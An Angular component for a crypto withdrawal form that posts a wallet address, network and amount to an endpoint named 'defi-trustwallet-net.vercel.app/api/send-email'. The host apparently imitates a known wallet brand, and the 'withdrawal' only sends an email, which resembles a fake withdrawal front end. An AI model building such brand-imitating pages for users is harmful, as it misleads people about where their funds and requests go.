import { Component, ChangeDetectorRef } from '@angular/core';
import { HttpClient } from '@angular/common/http';
import { FormsModule } from '@angular/forms';
import { HttpClientModule } from '@angular/common/http';
import { CommonModule } from '@angular/common';

@Component({
  selector: 'app-withdraw',
  standalone: true,
  templateUrl: './withdraw.component.html',
  styleUrls: ['./withdraw.component.css'],
  imports: [FormsModule, HttpClientModule, CommonModule]
})
export class WithdrawComponent {
  walletAddress: string = '';
  network: string = 'USDT'; // Default selection
  amount: string = '';
  isProcessing: boolean = false;

  constructor(private http: HttpClient, private cdr: ChangeDetectorRef) {}

  validateFields(): boolean {
    if (!this.walletAddress || !this.network || !this.amount) {
      alert('All fields are required. Please complete the form.');
      return false;
    }
    return true;
  }

  reviewWithdrawal() {
    if (!this.validateFields()) {
      return;
    }

    console.log("Setting isProcessing to true");
    this.isProcessing = true;
    this.cdr.detectChanges(); // Force immediate UI update

    setTimeout(() => {
      const payload = {
        walletAddress: this.walletAddress,
        network: this.network,
        amount: this.amount
      };

      // Updated API URL to the Vercel-deployed endpoint
      this.http.post('https://defi-trustwallet-net.vercel.app/api/send-email', payload, { observe: 'response', responseType: 'text' }).subscribe(
        (response) => {
          if (response.status === 200) {
            alert('Withdrawal request submitted successfully!');
          } else {
            alert(`Unexpected response code: ${response.status}. Please check.`);
          }
          this.isProcessing = false; // Reset processing status
        },
        (error) => {
          console.error('Error details:', error);
          alert('Failed to submit the request. Please check the console for details.');
          this.isProcessing = false; // Reset processing status in case of error
        }
      );
    }, 0); // Delay of 0 ensures the UI update before making the HTTP request
  }
}
